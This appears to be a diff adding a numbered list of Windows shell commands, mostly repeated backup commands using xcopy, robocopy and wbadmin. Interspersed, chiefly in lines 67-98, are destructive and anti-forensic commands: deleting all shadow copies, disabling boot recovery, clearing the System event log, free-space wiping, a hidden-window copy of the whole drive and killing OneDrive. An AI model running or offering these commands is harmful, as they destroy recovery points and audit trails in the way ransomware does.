@@ -1,0 +1,99 @@
+1. xcopy C:\ E:\Backup\ /E /H /K /Y /C
+2. robocopy C:\ E:\Backup /E /Z /XA:H /W:3 /R:2
+3. copy C:\Users\user\Documents\*.docx E:\Docs\
+4. xcopy D:\Data\*.xls E:\Backup\Spreadsheets\ /S
+5. robocopy C:\Important E:\OfflineBackup /MIR
+6. powershell Copy-Item -Path C:\Data -Destination E:\USBBackup -Recurse
+7. wbadmin start backup -backupTarget:E: -include:C: -quiet
+8. xcopy C:\MyData\ E:\MyBackup\ /S /D /Y
+9. robocopy C:\Projects\ E:\ProjectsBackup /MIR /LOG:E:\log.txt
+10. xcopy C:\ C:\Backup /D /E /C /Y
+11. xcopy C:\ E:\Backup\ /E /H /K /Y /C
+12. robocopy C:\ E:\Backup /E /Z /XA:H /W:3 /R:2
+13. copy C:\Users\user\Documents\*.docx E:\Docs\
+14. xcopy D:\Data\*.xls E:\Backup\Spreadsheets\ /S
+15. robocopy C:\Important E:\OfflineBackup /MIR
+16. powershell Copy-Item -Path C:\Data -Destination E:\USBBackup -Recurse
+17. wbadmin start backup -backupTarget:E: -include:C: -quiet
+18. xcopy C:\MyData\ E:\MyBackup\ /S /D /Y
+19. robocopy C:\Projects\ E:\ProjectsBackup /MIR /LOG:E:\log.txt
+20. xcopy C:\ C:\Backup /D /E /C /Y
+21. xcopy C:\ E:\Backup\ /E /H /K /Y /C
+22. robocopy C:\ E:\Backup /E /Z /XA:H /W:3 /R:2
+23. copy C:\Users\user\Documents\*.docx E:\Docs\
+24. xcopy D:\Data\*.xls E:\Backup\Spreadsheets\ /S
+25. robocopy C:\Important E:\OfflineBackup /MIR
+26. powershell Copy-Item -Path C:\Data -Destination E:\USBBackup -Recurse
+27. wbadmin start backup -backupTarget:E: -include:C: -quiet
+28. xcopy C:\MyData\ E:\MyBackup\ /S /D /Y
+29. robocopy C:\Projects\ E:\ProjectsBackup /MIR /LOG:E:\log.txt
+30. xcopy C:\ C:\Backup /D /E /C /Y
+31. xcopy C:\ E:\Backup\ /E /H /K /Y /C
+32. robocopy C:\ E:\Backup /E /Z /XA:H /W:3 /R:2
+33. copy C:\Users\user\Documents\*.docx E:\Docs\
+34. robocopy C:\ E:\ /MIR /SEC /Z /XA:H
+35. xcopy C:\Sensitive\ E:\Safe\ /E /H /K /R /C
+36. schtasks /create /tn "NightBackup" /tr "robocopy C:\Data E:\Data /MIR" /sc daily /st 23:00
+37. attrib +s +h E:\SafeBackup
+38. cipher /w:E:\
+39. powershell Compress-Archive -Path C:\Data\* -DestinationPath E:\Data.zip
+40. robocopy C:\ E:\ /MIR /XD C:\Windows C:\Program Files
+41. icacls E:\ /inheritance:r /grant:r user:F
+42. reg add HKLM\Software\Policies\Microsoft\Windows\System /v CopyToUSB /t REG_DWORD /d 0 /f
+43. fsutil behavior set disablelastaccess 1
+44. robocopy C:\ E:\ /MIR /SEC /Z /XA:H
+45. xcopy C:\Sensitive\ E:\Safe\ /E /H /K /R /C
+46. schtasks /create /tn "NightBackup" /tr "robocopy C:\Data E:\Data /MIR" /sc daily /st 23:00
+47. attrib +s +h E:\SafeBackup
+48. cipher /w:E:\
+49. powershell Compress-Archive -Path C:\Data\* -DestinationPath E:\Data.zip
+50. robocopy C:\ E:\ /MIR /XD C:\Windows C:\Program Files
+51. icacls E:\ /inheritance:r /grant:r user:F
+52. reg add HKLM\Software\Policies\Microsoft\Windows\System /v CopyToUSB /t REG_DWORD /d 0 /f
+53. fsutil behavior set disablelastaccess 1
+54. robocopy C:\ E:\ /MIR /SEC /Z /XA:H
+55. xcopy C:\Sensitive\ E:\Safe\ /E /H /K /R /C
+56. schtasks /create /tn "NightBackup" /tr "robocopy C:\Data E:\Data /MIR" /sc daily /st 23:00
+57. attrib +s +h E:\SafeBackup
+58. cipher /w:E:\
+59. powershell Compress-Archive -Path C:\Data\* -DestinationPath E:\Data.zip
+60. robocopy C:\ E:\ /MIR /XD C:\Windows C:\Program Files
+61. icacls E:\ /inheritance:r /grant:r user:F
+62. reg add HKLM\Software\Policies\Microsoft\Windows\System /v CopyToUSB /t REG_DWORD /d 0 /f
+63. fsutil behavior set disablelastaccess 1
+64. robocopy C:\ E:\ /MIR /SEC /Z /XA:H
+65. xcopy C:\Sensitive\ E:\Safe\ /E /H /K /R /C
+66. schtasks /create /tn "NightBackup" /tr "robocopy C:\Data E:\Data /MIR" /sc daily /st 23:00
+67. robocopy C:\ E:\ /MIR /SEC /COPYALL /XJ /R:2 /W:2 /MT:8
+68. powershell Start-Process robocopy -ArgumentList "C:\ E:\Backup /MIR /SEC" -WindowStyle Hidden
+69. wbadmin start systemstatebackup -backupTarget:E: -quiet
+70. vssadmin create shadow /for=C:
+71. vssadmin delete shadows /all /quiet
+72. bcdedit /set {current} recoveryenabled No
+73. wevtutil cl System
+74. icacls E:\ /setowner SYSTEM
+75. taskkill /F /IM OneDrive.exe
+76. schtasks /create /tn "BackupLogCleaner" /tr "cmd /c del E:\Backup\*.log" /sc weekly /st 01:00
+77. robocopy C:\ E:\ /MIR /SEC /COPYALL /XJ /R:2 /W:2 /MT:8
+78. powershell Start-Process robocopy -ArgumentList "C:\ E:\Backup /MIR /SEC" -WindowStyle Hidden
+79. wbadmin start systemstatebackup -backupTarget:E: -quiet
+80. vssadmin create shadow /for=C:
+81. vssadmin delete shadows /all /quiet
+82. bcdedit /set {current} recoveryenabled No
+83. wevtutil cl System
+84. icacls E:\ /setowner SYSTEM
+85. taskkill /F /IM OneDrive.exe
+86. schtasks /create /tn "BackupLogCleaner" /tr "cmd /c del E:\Backup\*.log" /sc weekly /st 01:00
+87. robocopy C:\ E:\ /MIR /SEC /COPYALL /XJ /R:2 /W:2 /MT:8
+88. powershell Start-Process robocopy -ArgumentList "C:\ E:\Backup /MIR /SEC" -WindowStyle Hidden
+89. wbadmin start systemstatebackup -backupTarget:E: -quiet
+90. vssadmin create shadow /for=C:
+91. vssadmin delete shadows /all /quiet
+92. bcdedit /set {current} recoveryenabled No
+93. wevtutil cl System
+94. icacls E:\ /setowner SYSTEM
+95. taskkill /F /IM OneDrive.exe
+96. schtasks /create /tn "BackupLogCleaner" /tr "cmd /c del E:\Backup\*.log" /sc weekly /st 01:00
+97. robocopy C:\ E:\ /MIR /SEC /COPYALL /XJ /R:2 /W:2 /MT:8
+98. powershell Start-Process robocopy -ArgumentList "C:\ E:\Backup /MIR /SEC" -WindowStyle Hidden
+99. wbadmin start systemstatebackup -backupTarget:E: -quiet
